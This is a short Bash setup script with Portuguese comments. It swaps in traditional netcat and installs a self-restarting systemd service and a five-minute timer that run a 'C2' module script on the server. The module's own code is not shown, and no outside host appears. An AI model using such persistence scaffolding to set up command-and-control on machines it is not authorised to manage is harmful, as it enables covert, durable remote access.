#!/bin/bash

#  -k 60

source .env

# Verificar se o script está sendo executado como root
if [ "$EUID" -ne 0 ]; then
    echo "Este script precisa ser executado como root."
    exit 1
fi

sudo apt remove netcat-openbsd -y
sudo apt install netcat

# Verificar se o Netcat está instalado
if ! command -v nc &> /dev/null; then
    echo "Netcat não está instalado. Por favor, instale o Netcat e execute este script novamente."
    sudo apt install netcat-traditional -y
    exit 1
fi

# Criar arquivo de serviço para o C2 SERVER SERVICE
echo "[Unit]
Description=Netcat Service
After=network.target

[Service]
Type=simple
Restart=always
ExecStart=/bin/bash -c '$ACTUALL/modules/C2/audit.sh'
User=$USER

[Install]
WantedBy=multi-user.target" > "$SYSTEMD/$NC_SERVICE"

echo "[Unit]
Description=Netcat Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=5min

[Install]
WantedBy=timers.target
" > "$SYSTEMD/$NC_TIMER"

# Recarregar serviços do systemd
sudo systemctl daemon-reload

# Iniciar e habilitar o serviço nc
sudo systemctl unmask $NC_SERVICE
sudo systemctl start $NC_SERVICE
sudo systemctl enable $NC_SERVICE
sudo systemctl unmask $NC_TIMER
sudo systemctl start $NC_TIMER
sudo systemctl enable $NC_TIMER

echo "Configuração do serviço Netcat concluída no Servidor."